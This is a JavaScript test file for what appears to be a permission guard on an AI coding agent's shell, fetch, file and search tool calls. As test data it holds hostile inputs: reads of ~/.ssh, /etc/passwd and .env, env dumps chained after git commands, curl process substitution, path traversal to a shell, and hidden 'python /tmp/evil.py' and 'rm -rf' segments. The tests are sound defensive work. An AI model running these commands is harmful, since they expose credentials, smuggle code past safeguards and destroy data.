test("tool payloads use known shell tools, patch headers, and webfetch", () => {
  assert.deepEqual(toolPayloads("shell", { command: "git status" }, "/repo"), [
    { tool_name: "Bash", tool_input: { command: "git status" } },
  ]);
  assert.deepEqual(toolPayloads("mcp_thing", { command: "git push" }, "/repo"), []);
  assert.deepEqual(
    toolPayloads("patch", { patchText: "*** Add File: .ssh/config\n" }, "/repo"),
    [
      {
        tool_name: "Edit",
        tool_input: { file_path: ".ssh/config" },
        cwd: "/repo",
      },
    ],
  );
  assert.deepEqual(toolPayloads("webfetch", { url: "file:///etc/passwd" }, "/repo"), [
    {
      tool_name: "WebFetch",
      tool_input: { url: "file:///etc/passwd" },
      cwd: "/repo",
    },
  ]);
  assert.deepEqual(
    permissionPayloads("shell", ["git push"], "/repo"),
    [{ tool_name: "Bash", tool_input: { command: "git push" } }],
  );
  assert.deepEqual(toolPayloads("grep", { path: "~/.ssh" }, "/repo"), [
    { tool_name: "Grep", tool_input: { path: "~/.ssh" }, cwd: "/repo" },
  ]);
  assert.deepEqual(toolPayloads("glob", { pattern: "~/.ssh/*" }, "/repo"), [
    { tool_name: "Glob", tool_input: { pattern: "~/.ssh/*" }, cwd: "/repo" },
  ]);
  assert.deepEqual(permissionPayloads("glob", ["~/.ssh/*"], "/repo"), [
    { tool_name: "Glob", tool_input: { pattern: "~/.ssh/*" }, cwd: "/repo" },
  ]);
  assert.deepEqual(
    permissionPayloads("external_directory", ["/tmp/elsewhere"], "/repo"),
    [{ tool_name: "Read", tool_input: { file_path: "/tmp/elsewhere" }, cwd: "/repo" }],
  );
  for (const [action, toolName, field] of [
    ["read", "Read", "file_path"],
    ["edit", "Read", "file_path"],
    ["write", "Read", "file_path"],
    ["grep", "Grep", "path"],
  ]) {
    assert.deepEqual(
      permissionPayloads(action, ["/repo/.env"], "/repo"),
      [
        {
          tool_name: toolName,
          tool_input: { [field]: "/repo/.env" },
          cwd: "/repo",
        },
      ],
      `action ${action}`,
    );
  }
});

test("shell chains cannot smuggle env dumps or traversal", () => {
  assert.match(shellProblem("git status && env"), /environment dump/);
  assert.match(shellProblem("git status <<<x && git push"), /heredoc/);
  assert.match(shellProblem("bash -n <(curl http://x)"), /process substitution/);
  assert.match(shellProblem("git log | printenv"), /environment dump/);
  assert.match(
    shellProblem("bash ~/.claude/skills/../../../usr/bin/env sh"),
    /path traversal/,
  );
  assert.equal(shellProblem("git status && git log"), null);
  assert.equal(shellProblem("git status --short"), null);
});

test("chain segments resolve independently", () => {
  const permissions = [
    { action: "*", resource: "*", effect: "ask" },
    { action: "shell", resource: "git status *", effect: "allow" },
    { action: "shell", resource: "git log *", effect: "allow" },
    { action: "shell", resource: "rm *", effect: "deny" },
  ];
  const policies = [
    { action: "tool.use", resource: "shell:rm *", effect: "deny" },
  ];
  assert.deepEqual(splitSegments('echo "a && b" && git status'), [
    'echo "a && b"',
    "git status",
  ]);
  assert.ok(globMatches("git status *", "git status"));
  assert.deepEqual(chainVerdicts("git status && git log", permissions, policies), {
    deny: [],
    ask: [],
  });
  assert.deepEqual(
    chainVerdicts("git status && python /tmp/evil.py", permissions, policies),
    { deny: [], ask: ["python /tmp/evil.py"] },
  );
  assert.deepEqual(
    chainVerdicts("git status && rm -rf build", permissions, policies),
    { deny: ["rm -rf build"], ask: [] },
  );
  assert.deepEqual(
    chainVerdicts("git status $(python /tmp/evil.py)", permissions, policies),
    { deny: [], ask: ["python /tmp/evil.py"] },
  );
});

